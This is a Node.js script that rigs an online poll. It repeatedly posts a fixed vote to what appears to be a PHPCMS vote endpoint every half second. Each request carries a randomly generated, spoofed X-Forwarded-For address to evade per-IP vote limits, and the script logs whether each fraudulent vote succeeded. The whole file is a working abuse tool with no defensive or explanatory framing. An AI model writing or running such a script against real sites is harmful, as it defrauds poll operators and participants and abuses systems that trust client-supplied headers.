var http = require('http'), querystring = require('querystring');

function addTicket(ip) {
   var post_data = querystring.stringify({
      'radio[]' : '220',
      'subjectid' : '12',
      'x' : '16',
      'y' : '10'
   });

   var options = {
      host : '',
      port : 80,
      path : '/index.php?m=vote&c=index&a=post&subjectid=12&siteid=1',
      method : 'POST',
      headers : {
         'X-Forwarded-For' : ip,
         'Content-Length' : post_data.length,
         'Content-Type' : 'application/x-www-form-urlencoded'
      }
   };

   var req = http.request(options, function(res) {
      console.log('STATUS: ' + res.statusCode);
      //console.log('HEADERS: ' + JSON.stringify(res.headers));
      res.setEncoding('utf8');

      res.on('data', function(chunk) {
         if (chunk.toString().indexOf('投票成功,正在返回 !') == -1) {
            console.log('刷票失败！');
         } else {
            console.log('刷票成功！');
         }
      });
   });

   req.write(post_data + '\n');
   req.end();
}

setInterval(function(){
   var ip = Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255);
   console.log('Request from: ' + ip);
   addTicket(ip);
}, 500);